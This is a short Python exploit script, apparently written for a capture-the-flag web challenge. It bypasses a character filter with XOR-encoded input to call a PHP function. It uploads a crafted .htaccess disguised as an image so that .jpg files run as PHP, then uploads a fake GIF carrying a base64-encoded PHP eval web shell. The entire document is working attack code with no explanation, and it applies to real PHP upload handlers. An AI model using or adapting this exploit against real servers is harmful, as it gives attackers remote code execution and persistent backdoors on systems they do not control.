import requests
import time

url = r"http://0d14487e-ac86-4a60-811d-d64ddb5f5a9b.node5.buuoj.cn:81/?_=${%80%80%80%80^%df%c7%c5%d4}{%80}();&%80=get_the_flag"
session = requests.session()
htaccess_content = '''
#define width 1337
#define height 1337
php_value auto_prepend_file "php://filter/convert.base64-decode/resource=./poc.jpg"
AddType application/x-httpd-php .jpg'''
files_htaccess = {'file': (
    '.htaccess', htaccess_content, 'image/jpeg')}
res_hta = session.post(url, files=files_htaccess)
print(res_hta.text)
shell_file = 'GIF89aaaPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+'
files_shell = {'file': (
    'poc.jpg', shell_file, 'image/jpeg')}
res_jpg = session.post(url, files=files_shell)

print(res_jpg.text)